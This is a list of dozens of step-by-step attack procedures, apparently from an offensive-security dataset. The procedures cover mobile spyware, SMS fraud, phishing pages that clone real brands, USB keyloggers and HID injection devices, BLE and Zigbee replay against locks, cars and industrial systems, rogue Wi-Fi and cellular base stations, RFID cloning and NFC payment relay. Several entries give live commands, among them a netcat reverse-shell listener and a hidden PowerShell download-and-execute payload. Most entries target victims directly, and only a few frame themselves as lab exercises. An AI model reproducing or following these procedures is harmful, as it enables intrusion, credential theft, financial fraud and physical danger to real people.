Step 1: Build an app and declare launcher activity with android:enabled=false.Step 2: Use code to disable launcher icon immediately after install using PackageManager.Step 3: App continues to run in background, performing data exfiltration.Step 4: Install app on phone and check app drawer (icon won't be visible).Step 5: Use ADB to verify running processes and service activity.Step 6: Check if background service is using internet or CPU.Step 7: Log data collection activity in local file.Step 8: Re-enable app icon using intent for control panel.

Step 1: Build an app requesting SEND_SMS, READ_PHONE_STATE, and optionally READ_SMS permissions.Step 2: Add code to simulate sending SMS to a premium-rate number using SmsManager.Step 3: Install the app on a rooted Android test phone with a SIM card.Step 4: Trigger SMS sending on app launch or timer.Step 5: Confirm delivery via system SMS logs.Step 6: Use a local fake premium number or a test SMS catcher service.Step 7: Check user billing to simulate real-world fraud impact.Step 8: Monitor SIM card access and app service behavior.

Step 1: Build an app that launches a system-style alert box (AlertDialog) on foreground.Step 2: Style it to look like a system prompt asking for credentials.Step 3: Trigger it using timer or background service.Step 4: Log whatever input user enters (PIN, email, password).Step 5: Store inputs locally or send to controlled server.Step 6: Install on test phone and observe prompt timing.Step 7: Enter dummy credentials to validate log storage.Step 8: Evaluate user ability to distinguish real vs fake prompt.

Step 1: Build fake Zoom invite HTML email. Step 2: Link button to zoom-corporate-login.com. Step 3: Set From header to noreply@zoom.us. Step 4: Send to employees using public SMTP relay. Step 5: User opens and clicks link. Step 6: Credentials are harvested via fake login form.

Step 1: Build or configure a PC Controller that pretends to support S2 during inclusion process.Step 2: Initiate pairing with an S2-capable device.Step 3: Respond positively to initial S2 negotiation frames.Step 4: During encryption key exchange, send no response or invalid payload.Step 5: Device assumes S2 is not supported after timeout.Step 6: Device restarts pairing and offers S0.Step 7: Accept S0 pairing and capture the cleartext key.Step 8: Use this key to impersonate controller and issue commands.Step 9: Demonstrate in lab how spoofed S2 support results in downgrade.Step 10: Emphasize importance of retry-on-failure enforcement for S2-only configurations.

Step 1: Build or download malicious ISO file with rootkit. Step 2: Use Rufus to create bootable USB. Step 3: Reboot target machine with USB inserted. Step 4: If boot order allows, system loads from USB. Step 5: Rootkit installs into bootloader/MBR.
Step 1: Build webcam device with motion sensor. Step 2: Configure it to start recording on movement. Step 3: Plug into victim machine. Step 4: Silent recording begins whenever user walks in.

Step 1: Bundle reverse shell in tar.gz (update.tar.gz).Step 2: Access admin panel at 192.168.2.70.Step 3: Upload via “System > OTA Update”.Step 4: Start listener: nc -lvnp 4444.Step 5: Apply update and wait.Step 6: Reverse shell spawns.Step 7: Modify device operation logic.

Step 1: Buy Arduino Leonardo (or Digispark) which supports HID emulation. Step 2: Install Arduino IDE on your computer. Step 3: Write a script in Arduino to open terminal and run malicious commands (e.g., add new admin user). Step 4: Upload code to board and plug it into victim machine. Step 5: The device types automatically like a keyboard.

Step 1: Buy USB sound card device (cheap online). Step 2: Write script to record system mic input and save .WAV files. Step 3: Plug into target PC – acts as microphone. Step 4: Record passively in background. Step 5: Retrieve device to listen to audio.

Step 1: Buy a USB hardware keylogger (available online).Step 2: Visit a public/shared PC (e.g., school, library, office).Step 3: Unplug the keyboard from the PC.Step 4: Insert the USB keylogger in the USB port, then plug the keyboard into it.Step 5: Leave the device. Return later to retrieve the USB and read stored keystrokes on another computer.

Step 1: Buy a USB keylogger online (tiny device that logs keyboard data). Step 2: Find unattended system (e.g., office workstation). Step 3: Plug the keylogger between the keyboard USB cable and the PC USB port. Step 4: After a few hours or days, retrieve the device. Step 5: Connect it to your own PC and read logs (most devices save keystrokes in .txt format).

Step 1: Buy a few cheap USB drives. Step 2: Use a computer to load a small harmless script that opens a browser and sends device info to a server. Step 3: Label the USBs with tempting names like “Salary Info” or “Confidential”. Step 4: Leave them in the office break room, bathroom, or lobby. Step 5: Wait and track if any device connects.

Step 1: Buy a wireless keyboard sniffer (keylogger USB). Step 2: Wait for manager to leave desk. Step 3: Plug in device between wireless receiver and USB port. Step 4: Let it run silently to collect keystrokes. Step 5: Retrieve device later and extract logged data.

Step 1: Buy/modify a USB charging cable to include a chip (like ESP32). Step 2: Program chip to act like a keyboard and run malicious commands. Step 3: Leave cable at airport/public charger. Step 4: Victim plugs into laptop → attack runs silently.

Step 1: Calibrate a parabolic antenna to beam high-power Wi-Fi signals at the target lab/device. Step 2: Fire controlled pulse bursts matching QRNG sampling windows. Step 3: Use SDR to capture QRNG signal response and entropy fluctuations. Step 4: Iterate and fine-tune pulses to induce predictable biases. Step 5: Record resulting RNG values and use for key inference. Step 6: Demonstrate encrypted traffic decryption.

Step 1: Capture BLE packets from guest’s phone as it opens hotel room. Step 2: Analyze GATT commands responsible for unlocking. Step 3: Clone BLE profile and MAC with Flipper Zero. Step 4: Replay unlock command near hotel room door. Step 5: Door opens, attacker enters room undetected.

Step 1: Capture BLE packets from real car key using Ubertooth. Step 2: Extract unlock command and characteristic handle. Step 3: Clone the packet structure using Flipper Zero. Step 4: Emulate fob’s MAC and write unlock request to the car’s BLE receiver. Step 5: Door unlocks without owner key.

Step 1: Capture DNP3 traffic during normal relay control using Wireshark.Step 2: Extract packets containing Function Code 5 (Operate).Step 3: Use Scapy with DNP3 extension or custom script to resend captured packet.Step 4: Replay both "Trip" and "Close" commands in sequence with legitimate-looking timestamps.Step 5: Monitor HMI logs – they show the action as if initiated by an operator.Step 6: Verify if audit logs mismatch with actual user sessions.Step 7: Confirm system accepted spoofed commands.

Step 1: Capture FT authentication frames during a legitimate roaming event using Wireshark.Step 2: Use Scapy to replay these authentication frames periodically.Step 3: Client sees repeated roam commands and becomes unstable.Step 4: Some clients might disconnect or reauthenticate to attacker-controlled AP.Step 5: Collect client-side logs for analysis.

Step 1: Capture IMAP credentials using previous sniffing technique (e.g., Wireshark on port 143).Step 2: Note down username and password from captured session.Step 3: Open Telnet or netcat and manually connect to IMAP server:telnet imap.server.com 143Step 4: Use captured credentials to authenticate:A LOGIN user@example.com password123Step 5: Browse mailbox via IMAP commands (e.g., LIST, SELECT, FETCH).Step 6: Demonstrate data extraction or spoofed read status.

Step 1: Capture ON command for electric kettle using sniffer.Step 2: Replay it multiple times even after it’s turned off.Step 3: Kettle turns ON again and again, risking dry boil.Step 4: In real scenario, this can cause overheating.

Step 1: Capture WPA3 handshake using monitor mode adapter.Step 2: Extract handshake using Wireshark.Step 3: Build a custom wordlist using predictable password variations based on SSID (e.g., MyWiFi2024, MyWiFi2025).Step 4: Use hashcat with SAE cracking mode to test the wordlist.Step 5: Identify successful key derivation and log successful passwords.

Step 1: Capture Zigbee ON + volume-up command.Step 2: Replay packet at 2AM remotely.Step 3: Audio system turns on at full volume.Step 4: Victim wakes up and system causes stress.Step 5: Repeat across nights to intimidate.

Step 1: Capture Zigbee beacons for group controller initiation in QSM network.Step 2: Replay beacon frames with altered controller IDs.Step 3: New devices join rogue group and share keys assuming it’s secure.Step 4: Intercept keys or control messages.Step 5: Simulate fake messages to confuse participants.

Step 1: Capture Zigbee packet reporting high pressure.Step 2: Replay this packet to SCADA system.Step 3: System wrongly triggers emergency vent.Step 4: This leads to gas waste or false alarms.Step 5: Repeat to degrade trust in sensors.

Step 1: Capture a common interaction command like "status request" from Zigbee-enabled smart lock.Step 2: Save and replay this harmless command continuously.Step 3: The smart lock wakes up every time the packet is received, using more battery.Step 4: Over the course of hours or days, the lock loses charge quickly.Step 5: Demonstrate to learners how even non-malicious packets can be weaponized.Step 6: Discuss implications on low-power IoT.

Step 1: Capture a normal FT reassociation frame using Wireshark.Step 2: Use Scapy to split the frame into non-standard fragments.Step 3: Inject fragmented reassociation frames targeting the AP.Step 4: Poorly coded APs may misinterpret fragments, crash, or allow incorrect associations.Step 5: Repeat for clients to test which devices are vulnerable.Step 6: Analyze logs or crash behaviors.

Step 1: Capture actuator command packet sent from gateway to deviceStep 2: Save the frame, including DevAddr and payloadStep 3: Re-broadcast the packet using HackRF on the correct channelStep 4: Wait for actuator device to accept and execute commandStep 5: Observe physical change (e.g., valve opens) without permissionStep 6: Repeat to simulate persistent control abuse

Step 1: Capture an FT session where a key pair is established.Step 2: Replay a modified reassociation frame with another device’s MAC but same session key.Step 3: Client or AP accepts the session as valid.Step 4: Allows unauthorized data injection or decryption.Step 5: Log traffic from the hijacked session.

Step 1: Capture beacon and broadcast packets from suspected PQ devices.Step 2: Extract metadata like beacon intervals, packet size variance, and signal strength.Step 3: Build a time series model using AI (e.g., LSTM) to predict periodic behaviors.Step 4: Identify unusual spikes which may indicate cryptographic handshakes.Step 5: Use these windows for focused traffic or physical interception.

Step 1: Capture broadcast handshake from test device using SDR. Step 2: Log ephemeral key contents broadcast by device. Step 3: Use PQEphemeralValidator to check for repeat across time. Step 4: Replay ephemeral key to server without session timestamp. Step 5: Gain connection using broadcast key from past session. Step 6: Simulate data access with old session ID.

Step 1: Capture curtain open command using Wireshark.Step 2: Export the relevant frame to binary.Step 3: Replay at odd hours using HackRF.Step 4: Curtains open without consent.Step 5: Allows attacker to view inside home.

Step 1: Capture encrypted RF packets using SDR. Step 2: Measure packet burst intervals for each key press. Step 3: Build timing model for common words/passwords. Step 4: Correlate live inputs to known timing patterns. Step 5: Log matches and infer typed content.

Step 1: Capture encrypted keystroke RF transmissions using SDR (focus on packet timing, not content). Step 2: Isolate the transmission time intervals between successive packets. Step 3: Map typing speed and rhythm to patterns from leaked password datasets (e.g., typing "password" has distinctive delays). Step 4: Use clustering algorithms to match captured sequences to likely plaintext. Step 5: Report confidence score for each guessed password. Step 6: Repeat with multiple captures for higher accuracy.

Step 1: Capture legitimate wireless packets during PQ key exchange between two devices.Step 2: Use a generative adversarial network (GAN) to mutate fields (length, flags, sequence number) in a way that appears valid but stresses the parser.Step 3: Inject these "semi-valid" packets into the air during next exchange using a packet injection-capable Wi-Fi card.Step 4: Observe whether devices crash, time out, or fall back to insecure modes.Step 5: Log any error-handling behaviors to plan further PQ cryptanalysis or replay.

Step 1: Capture multiple FT re-association packets from various devices.Step 2: Measure time intervals between authentication and reassociation responses.Step 3: Analyze FT handshake pattern uniqueness (vendor-specific delays or field orders).Step 4: Use timing patterns to fingerprint devices (e.g., Apple vs Samsung).Step 5: Use this data to build targeted phishing or further rogue AP attacks.

Step 1: Capture packet sizes and timing from Wi-Fi or BLE communications, ignoring content (fully encrypted).Step 2: Label different PQ crypto protocols (e.g., Kyber, Dilithium) based on their characteristic packet size patterns.Step 3: Train a machine learning model (e.g., random forest or LSTM) to classify the protocol used just from this size sequence.Step 4: Use output to focus next-stage cryptanalysis or fault testing based on the identified protocol's known weaknesses.Step 5: Refine the model with additional data from test lab PQ protocol runs.

Step 1: Capture probe requests from clients using Kismet.Step 2: Identify requests for legacy networks.Step 3: Set up rogue AP with same SSID using airbase-ng.Step 4: Broadcast legacy WPA2-only beacon.Step 5: Client auto-connects.Step 6: Intercept traffic and analyze unencrypted metadata.Step 7: Extract session cookies or credentials if available.Step 8: Log and replay data in controlled environment.

Step 1: Capture real LoRa packets to study MIC formatStep 2: Develop script to brute-force or guess MIC combinationsStep 3: Use Arduino + LoRa module to inject custom payloadsStep 4: Monitor gateway logs to see if any packets get acceptedStep 5: If accepted, observer sees fake data polluting the backendStep 6: Repeat to create persistent false data stream

Step 1: Capture wireless traffic (e.g., Zigbee, BLE, Wi-Fi) over several days from a PQ-enabled system.Step 2: Log and timestamp packets, focusing on regularity of encryption events (e.g., when encrypted traffic spikes).Step 3: Feed timestamps into a long short-term memory (LSTM) time-series model trained to forecast periodic events.Step 4: AI predicts windows when future PQ key rotations are likely (e.g., every 6 hours).Step 5: Attacker prepares targeted eavesdropping or replay just before predicted rotation for maximum exposure.

Step 1: Carefully open the smartwatch using prying tool.Step 2: Locate NAND memory chip and desolder it using hot air.Step 3: Place chip in NAND reader and use software to dump data.Step 4: Browse through data to find SMS, login tokens, or app data.Step 5: Store dump, reattach chip, and reassemble device.

Step 1: Carefully unscrew the pump casing.Step 2: Locate UART headers.Step 3: Connect TX/RX/GND to USB converter.Step 4: Launch terminal and observe logs.Step 5: Interrupt boot or access CLI.Step 6: Alter dosage settings/logs and exit.

Step 1: Carry a shoulder bag with a hidden RFID reader antenna wired to a Proxmark3.Step 2: Stand close to the cafeteria entrance during peak hours.Step 3: Wait until employees begin scanning their attendance RFID cards.Step 4: Automatically capture and log each card’s UID and interaction data as they scan.Step 5: Save all captured signals to a laptop or onboard memory.Step 6: Later analyze this data to check for duplicate or predictable patterns.

Step 1: Choose a known username like john.doe.Step 2: Send emails using variations like John.Doe, JOHN.DOE, jOhn.dOe.Step 3: Observe the bounce-back messages.Step 4: Some systems may return “no such user” for case mismatch, revealing exact casing.Step 5: Use correctly cased usernames in future phishing for credibility.

Step 1: Choose a system that uses an ML model to make real-time decisions — such as a visual inspection system for manufacturing defects, or a credit scoring model for instant loan decisions. These models take continuous input features (e.g., sensor values, pixel intensities, financial indicators). Step 2: Obtain or reverse-engineer the input format. You can do this by capturing request payloads, API calls, or inspecting web/mobile app behavior. Step 3: Analyze the model’s behavior using slightly perturbed inputs. For example, if the sensor normally outputs [1.0, 0.9, 1.1], try [1.0, 1.05, 1.2]. These small shifts may seem harmless but can affect the model due to high sensitivity at decision boundaries. Step 4: For tabular models (fraud, scoring), try increasing features like “transaction amount” or “frequency” by very small steps (e.g., +0.01%) and record the change in prediction. For image-based systems (e.g., crack detection), apply brightness shifts, rotation, or pixel blurring. Step 5: Identify inputs where small changes flip the prediction — e.g., from “fraud” to “legit”, or from “defective” to “clean.” These are borderline areas where the model is vulnerable to test-time drift. Step 6: Use these sensitive spots to systematically craft payloads that just barely avoid detection. This lets attackers commit fraud, ship defective parts, or bypass moderation without needing full poisoning or retraining. Step 7: Continue refining the perturbations to stay within limits that seem natural or pass human review. For instance, sensor data may be shifted by 0.2% — not noticeable to humans but enough to bypass ML-based filters. Step 8: This attack is especially useful where the model is not re-evaluated often or doesn’t use adversarial defense. You exploit model drift tolerance at the inference phase without needing training access.

Step 1: Click Start → Search for "Event Viewer". Step 2: Navigate to “Windows Logs” → “Security”. Step 3: Right-click → “Clear Log…” → Save or Discard. Step 4: Repeat for “System” and “Application” logs. Step 5: Insider does malicious action (e.g., unauthorized data access). Step 6: No trace is left in event logs.

Step 1: Click on “Complete KYC Verification” link in SMS/email.Step 2: Download and install fake e-KYC EXE.Step 3: App asks to upload ID – appears to fail upload.Step 4: Rootkit installs and monitors Documents and Downloads folders.Step 5: Personal docs are silently exfiltrated.

Step 1: Clicks photo of floor plan from wall/desk. Step 2: Sends it via personal phone to third-party. Step 3: Attacker uses it to locate server room or blind spots. Step 4: Uses knowledge for intrusion.

Step 1: Clone BLE UUID and MAC address of employee's BLE beacon. Step 2: Flash ESP32 with this identity and position it near scanner. Step 3: Attendance system detects spoofed beacon as if employee is present. Step 4: Attendance gets logged without employee being onsite.

Step 1: Clone GitHub’s security email format.Step 2: Build a reverse shell payload and compress it into a .tar.gz file named libssl_patch.tar.gz.Step 3: Upload payload to file hosting (anonfiles, etc.).Step 4: Compose spoofed email with subject “Critical libssl vulnerability patch for devops”.Step 5: Add GitHub-style warning footer, send to IT/devops team.Step 6: If victim extracts and runs file, reverse shell is opened.Step 7: Attacker uses shell to map IT infrastructure.

Step 1: Clone PayPal dispute page using HTML.Step 2: Email victim with “Dispute Opened – Action Needed”.Step 3: Victim clicks the link, lands on cloned login page.Step 4: Inputs PayPal login credentials.Step 5: Attacker captures and uses login for fraudulent payments.Step 6: Victim's funds are transferred or accounts used for laundering.Step 7: Identity may be sold online.

Step 1: Clone QKD controller’s Wi-Fi AP with identical SSID and MAC spoof.Step 2: Jam original AP using directional interference.Step 3: Redirect photon emitter control signals to fake AP.Step 4: Send fake API trigger via cloud spoof.Step 5: Photon emitter generates sequences based on fake inputs.Step 6: Intercept classical channel logs to reconcile keys.Step 7: Disconnect before authentication system flags session.

Step 1: Clone Rubber Ducky script library and adapt it to MouseJack’s format.Step 2: Detect vulnerable receiver using scan.py.Step 3: Inject a full encoded script that downloads malicious tools, adds user, modifies firewall.Step 4: Example payload: powershell -w hidden IEX (New-Object Net.WebClient).DownloadString(...).Step 5: System is compromised with multi-stage access.Step 6: Persistence is achieved through script injection.

Step 1: Clone SSID and BSSID of the PQC mesh AP using hostapd.Step 2: Set up a rogue repeater that receives client connection attempts.Step 3: Configure the backhaul to connect only to a legacy WPA2 AP.Step 4: Clients unknowingly connect to rogue repeater thinking it's part of the mesh.Step 5: All traffic is forwarded to the legacy AP.Step 6: Use mitmproxy to log and modify traffic.Step 7: Demonstrate credential and session hijack possibilities.Step 8: Analyze and educate on wireless mesh repeater behavior.

Step 1: Clone SSID of target AP and configure a rogue AP using airbase-ng.Step 2: Alter the Mobility Domain ID in beacon/association response frames to a conflicting value.Step 3: When client attempts to roam, it checks for consistent FT parameters.Step 4: Due to mismatch in expected and received mobility domain, FT handshake fails.Step 5: Some devices crash or loop through failed roaming attempts.Step 6: Log repeated authentication failures and roaming failures.

Step 1: Clone Spotify’s security alert page. Step 2: Embed JavaScript to capture keystrokes and deliver background payload. Step 3: Send email with “Unusual Login Detected” header. Step 4: Victim clicks “Review Activity” link. Step 5: Page loads silently installs spyware. Step 6: Victim enters credentials which attacker captures. Step 7: Malware runs in background collecting audio or browsing history.

Step 1: Clone Zoom update interface. Step 2: Bundle polymorphic spyware with installer. Step 3: Share link as “Urgent Zoom Security Update”. Step 4: User installs it; spyware launches silently. Step 5: Records webcam/microphone without user consent. Step 6: Rewrites parts of code every day. Step 7: Avoids signature detection through mutation.

Step 1: Clone a basic Google Docs-looking HTML page.Step 2: Add button labeled "Download Report".Step 3: Behind button, link to ransomware EXE.Step 4: Open site on victim browser in lab.Step 5: Victim clicks download and runs file.Step 6: Files encrypted, ransom note appears.

Step 1: Clone a login page (e.g., Facebook).Step 2: Add JavaScript to capture typed usernames/passwords.Step 3: Host on free domain (e.g., 000webhost).Step 4: Share shortened link via WhatsApp or Telegram.Step 5: Users type credentials which are logged and sent to attacker.

Step 1: Clone a real webcam enhancement tool.Step 2: Bind it with a keylogger EXE.Step 3: Post in a forum with screenshots and fake reviews.Step 4: Victim installs it.Step 5: Keylogger runs in background.

Step 1: Clone a real-looking Excel budget sheet from web templates.Step 2: Add a VBA macro that executes a hidden shell payload.Step 3: Host the shellcode on attacker server.Step 4: Embed macro to download & execute shell.Step 5: Save file as “Q4_Budget_Template.xlsm”.Step 6: Send via email with a spoofed domain like “budget@accountsreview.com”.Step 7: User opens and enables macro to see calculations.Step 8: Payload downloads and executes silently.

Step 1: Clone a realistic-looking Microsoft Azure login page.Step 2: Use MITMproxy to intercept and forward all data.Step 3: Craft a LinkedIn message: “We’re hiring! See JD: [shortened URL]”.Step 4: Send InMail to target victims.Step 5: Victim clicks the link and opens the fake Azure page.Step 6: Victim enters credentials and token is intercepted via proxy.Step 7: Use token to log into the Azure or Microsoft 365 environment.

Step 1: Clone an actual lawsuit PDF format using public templates.Step 2: Insert malicious JavaScript using Adobe Acrobat Pro (or script it with SET).Step 3: Compose a spoofed email from a domain like “legal@[fakefirm].org” with legal language.Step 4: Attach the infected “Summons_Notice.pdf”.Step 5: Send to legal or compliance team.Step 6: If opened in vulnerable Acrobat version, the JS executes a hidden payload.Step 7: The JS downloads a secondary reverse shell script.Step 8: Attacker gains access to internal legal data.

Step 1: Clone an open-source tool (like mail-backup) that requires POP3 login.Step 2: Add a few lines of code to silently write credentials to a hidden file or remote server.Step 3: Distribute the script in a simulated classroom environment or GitHub.Step 4: Victim runs it to backup emails.Step 5: Script logs credentials.Step 6: Use these to demonstrate unauthorized access to POP3 server.

Step 1: Clone interface of Foxit or Adobe Reader.Step 2: Embed keylogger in the background process.Step 3: Share via forums or fake review sites.Step 4: User installs it as alternative reader.Step 5: Reader works, but logs all typed text system-wide.

Step 1: Clone target SIM using SIMtrace or card reader.Step 2: Modify Access Technology Preference field in SIM EF files.Step 3: Write SIM to blank programmable SIM card.Step 4: Insert into test device or victim testbed.Step 5: When device boots, it avoids 5G/4G and registers to 2G.Step 6: Launch fake 2G BTS to accept connection and sniff traffic.Step 7: Capture IMSI and intercept calls/SMS.

Step 1: Clone target SSID and FT configuration.Step 2: Configure two rogue APs with alternating BSSIDs and stronger signal.Step 3: As client connects to one, increase signal of the other.Step 4: Client roams, repeats handshake again.Step 5: Continue loop for several minutes to cause disconnection or battery exhaustion.

Step 1: Clone the target’s SSID as WPA2 using hostapd.Step 2: Place rogue AP near smart devices.Step 3: Power cycle the smart device (unplug/replug or use switch).Step 4: Device reconnects to Wi-Fi — if it prefers signal strength over protocol, it connects to rogue AP.Step 5: Run hcxdumptool to capture PMKID from reconnection.Step 6: Convert .pcapng to hash format.Step 7: Crack using hashcat.

Step 1: Collect logs of previous QKD sessions over weeks.Step 2: Analyze bit acceptance and basis pattern trends.Step 3: Identify recurring polarization or time-of-flight patterns.Step 4: Build a photon injection model based on prediction.Step 5: Emit photons matching predicted acceptance.Step 6: Observe successful matches via classical reconciliation.Step 7: Validate prediction success with stolen keys.

Step 1: Compromise one workstation via phishing + [Mimikatz] to extract credentials.Step 2: Uses [NetShare Scanner] to locate shared STEP7 project folders.Step 3: Modifies projects with hidden logic.Step 4: Uses [Responder] to harvest more credentials via LLMNR spoofing.Step 5: Waits for another engineer to open infected project and upload logic.Step 6: Repeat spread across other stations silently.Step 7: Logic contains logic bombs activated at defined sensor states.Step 8: No malware persists on disk — only infected project files.

Step 1: Compromises one internal email account using phishing.Step 2: Uses the compromised account to email multiple departments at once.Step 3: Sends different tailored messages to each team: gift card request to HR, invoice to Finance, NDA to Legal.Step 4: All messages appear legitimate since they come from internal source.Step 5: Each department responds independently, unaware of attack campaign.Step 6: Attacker collects funds from multiple sources.Step 7: Cleanup script deletes inbox rules and emails.

Step 1: Conduct an initial scan using nmap -p 1080,3128,8080,8888 10.0.0.0/24.Step 2: Use banner grabbing or nmap -sV to identify if open ports are proxies.Step 3: If open, test with ProxyChains by routing a scan or curl command via the proxy IP.Step 4: If ICS response is received through proxy, mark the proxy as an internal pivot point.Step 5: Use proxy to relay future attacks or scans into deeper ICS layers.

Step 1: Configure Adafruit BLE device to operate in HID (keyboard) mode. Step 2: Modify firmware to include automated keystroke payload (e.g., open browser, type phishing link). Step 3: Power on the device near target smartphone with BLE enabled. Step 4: Phone auto-pairs or accepts rogue device as a keyboard. Step 5: Keystroke injection begins: opens browser, types "malicioussite.com", presses Enter. Step 6: Victim unknowingly opens malicious site.

Step 1: Configure Amarisoft 5G Callbox with a spoofed PLMN to match victim’s carrier.Step 2: Simulate temporary service rejection (Service Not Allowed) on 5G.Step 3: Device falls back to LTE for continuity.Step 4: Launch rogue LTE eNodeB using SrsRAN on fallback band.Step 5: Accept connection and capture device IMSI before encryption starts.Step 6: Log and correlate IMSIs to known subscriber identities.

Step 1: Configure Amarisoft to broadcast a fake SIB1 block for a 5G cell.Step 2: Manipulate cell reselection parameters to reduce cell priority.Step 3: UE interprets low priority and searches for LTE alternatives.Step 4: Start LTE rogue eNodeB to accept connections.Step 5: Extract IMSI from device prior to encryption.Step 6: Log and analyze connection behavior.

Step 1: Configure BLE Mesh to rotate PQ group key every 10 min using system time entropy. Step 2: Log key changes over time and derive key rotation logic. Step 3: Use PQGroupKeyPredictor to simulate future keys. Step 4: Inject attacker node into mesh with next key. Step 5: Gain trust of mesh without invitation. Step 6: Log traffic and confirm attacker has access to encrypted mesh data.

Step 1: Configure ModbusPal with valves and leak indicator registers.Step 2: Observe normal leak indicator register value (e.g., 0 = no leak).Step 3: Craft a Modbus Write Single Register command and set leak register to 1.Step 4: Spoof the message as coming from the valve sensor.Step 5: HMI receives fake alert and shows leak message.Step 6: Operator mistakenly initiates maintenance.

Step 1: Configure OpenBTS to act as a 2G tower.Step 2: Develop a message injection script for emergency alert format.Step 3: Broadcast cell broadcast alerts (e.g., “Evacuate Area”).Step 4: Observe mobile phones receiving messages.Step 5: Educate on risks of fake alerts and misinformation.Step 6: Remove fake BTS after simulation.

Step 1: Configure PC Controller to emulate a master controller using S0 only.Step 2: One by one, unpair devices from their legitimate hub.Step 3: Immediately start pairing to rogue controller.Step 4: All devices use S0 due to fallback.Step 5: Log each key during pairing.Step 6: Gain full command-and-control over the network from rogue controller.

Step 1: Configure Pineapple to clone known SSIDs (e.g., “OfficeWiFi”).Step 2: Enable logging and monitor POP3 and IMAP ports (110, 143).Step 3: Victim’s device auto-connects and attempts to sync email.Step 4: Credentials sent without encryption are logged.Step 5: View logs or use tcpdump to isolate password strings.Step 6: Test login to local email server.

Step 1: Configure Raspberry Pi with PN532 reader using I2C or SPI mode. Step 2: Use Python scripts to capture NFC data from a payment card. Step 3: Transmit this data via LAN or Wi-Fi to a second Raspberry Pi or emulator device. Step 4: The second device emulates the NFC card at a POS terminal. Step 5: Successful transaction occurs while the real card is in attacker’s possession remotely.

Step 1: Configure a Linux machine with a wireless adapter in monitor mode using airmon-ng.Step 2: Write a Python script using Scapy to create fake SAE commit messages with random MAC addresses (to simulate thousands of clients).Step 3: Continuously send these messages to the WPA3 access point without completing the handshake.Step 4: Monitor the access point — it will begin allocating memory to handle each fake handshake.Step 5: Eventually the AP runs out of memory or enters a denial-of-service state where it stops accepting new clients.Step 6: Log memory usage and crash behavior from the AP console or syslog.

Step 1: Configure a PQ-enabled BLE device to reset entropy seed to a fixed value on reboot (educational setting). Step 2: Sniff pairing attempts with BLEAH over multiple reboots. Step 3: Notice identical public PQ keys generated every time. Step 4: Emulate an attacker precomputing private response. Step 5: Reuse that private key to impersonate legitimate device. Step 6: Observe pairing success and log attacker’s session.

Step 1: Configure a rogue AP using hostapd-wpe to mimic a WPA3 SSID.Step 2: Advertise WPA3 capability, but allow fallback to WPA2 under the hood.Step 3: Victim connects assuming WPA3 security.Step 4: Capture handshake and credentials (MSCHAPv2) using logging.Step 5: Replay or crack credentials offline.

Step 1: Configure a rogue Wi-Fi hotspot with same SSID as legitimate network.Step 2: Use Bettercap to create a man-in-the-middle environment and capture traffic.Step 3: Encourage the victim device to connect to the fake AP (disable other known networks).Step 4: On victim system, use a POP3 client like Outlook Express to connect to the mail server (plaintext, port 110).Step 5: On the attacker system, capture traffic using Wireshark with filter tcp.port == 110.Step 6: Decode and extract the username and password from packet payload.Step 7: Use credentials to demonstrate inbox access.

Step 1: Configure attacker’s Wi-Fi adapter in monitor mode using airmon-ng.Step 2: Start hostapd-wpe or use Dragonblood's tools to simulate a fake WPA3 AP.Step 3: During the handshake, respond with a weak or invalid elliptic curve (e.g., group 19 instead of 21).Step 4: Trick the client into performing key exchange using this insecure curve.Step 5: Capture the handshake and perform brute-force attacks more easily due to the reduced key strength.

Step 1: Configure multiple devices to derive PQ keys using static MAC as salt. Step 2: Capture key exchange packets using Aircrack-ng. Step 3: Log PQ session keys across different devices. Step 4: Observe identical keys in cases where MAC address is reused. Step 5: Replay session handshake from one device to another. Step 6: Confirm server accepts duplicate key as valid.

Step 1: Configure your Raspberry Pi with airbase-ng to broadcast a fake SSID like "HP_OfficeJet_Pro_123".Step 2: Run a fake printer service (e.g., using Pretender or a custom HTTP server mimicking a printer UI).Step 3: Wait for users to connect and send print jobs.Step 4: Capture submitted files, or redirect them to a different real printer for stealth.Step 5: Log user information or modify documents in transit.

Step 1: Confirm that the MCU supports SPI via UART bridge (common in some SoCs). Step 2: Attach FTDI adapter to UART headers and activate SPI mode. Step 3: Use Flashrom to identify and read flash memory via the SPI bridge. Step 4: Save firmware image locally. Step 5: Analyze firmware for credentials or vulnerabilities.

Step 1: Connect Arduino’s MOSI/SCK/GND to target’s SPI interface. Step 2: Write script to send specific command (e.g., unlock or config update). Step 3: Power device and run Arduino script during boot. Step 4: If command accepted, device behavior changes (e.g., unlocks features).

Step 1: Connect CEC device to HDMI of target TV.Step 2: Use software to send commands like “Power Off”, “Source Change”, etc.Step 3: Observe behavior and capture screen data.Step 4: Loop malicious command (e.g., reset volume, disrupt streaming).Step 5: Disconnect after attack.Step 6: TV remains misconfigured.

Step 1: Connect ChipWhisperer to target power line (e.g., VCC). Step 2: Program it to momentarily drop or spike voltage during boot. Step 3: Reboot device and time glitch near check (e.g., secure boot). Step 4: If timing successful, device skips password or executes unsigned code. Step 5: Use result to extract data or install custom firmware.

Step 1: Connect Crazyradio PA USB to attacker laptop.Step 2: Clone MouseJack repo and run scan.py to find RF keyboards.Step 3: Once a target is detected, use inject.py to simulate pressing Win + R.Step 4: Type chrome https://fake-login.site and press Enter.Step 5: Browser opens with phishing site, which mimics Office365 or Google login.Step 6: Victim may unknowingly enter credentials.Step 7: Capture entries via keylogger or fake form.

Step 1: Connect Crazyradio PA dongle to the attacker laptop. Step 2: Install RfCat and required drivers. Step 3: Tune to the known frequency range used by Microsoft keyboards (e.g., 27 MHz or 2.4GHz). Step 4: Run a keystroke logger script that filters captured packets. Step 5: Capture typed data including login credentials.

Step 1: Connect EM probe near debug lines (UART, I2C, etc.).Step 2: Record signal with oscilloscope during device operation.Step 3: Identify signal pattern during keypad press or data exchange.Step 4: Train model or observe waveform differences.Step 5: Match signal peaks to characters.Step 6: Derive PIN or password from timing.Step 7: Use extracted data to gain access.

Step 1: Connect HDMI emulator to a device between real display. Step 2: Configure EDID spoof to advertise false resolutions or capabilities. Step 3: When device boots, it reads the false EDID and adapts display output. Step 4: Use this to mirror, distort, or redirect visual output.

Step 1: Connect Pi GPIO pins (MISO, MOSI, CLK, CS, GND) to the flash chip. Step 2: Enable SPI interface on Raspberry Pi using raspi-config. Step 3: Run flashrom -p linux_spi:dev=/dev/spidev0.0 -r dump.bin to read firmware. Step 4: Use binwalk -e dump.bin to extract partitions. Step 5: Analyze extracted files using Ghidra.

Step 1: Connect Proxmark3 to USB port. Step 2: Use it to scan victim’s RFID badge (e.g., office entry). Step 3: Save the captured UID and data. Step 4: Write the data onto a blank RFID/NFC card. Step 5: Use the cloned card for unauthorized access.

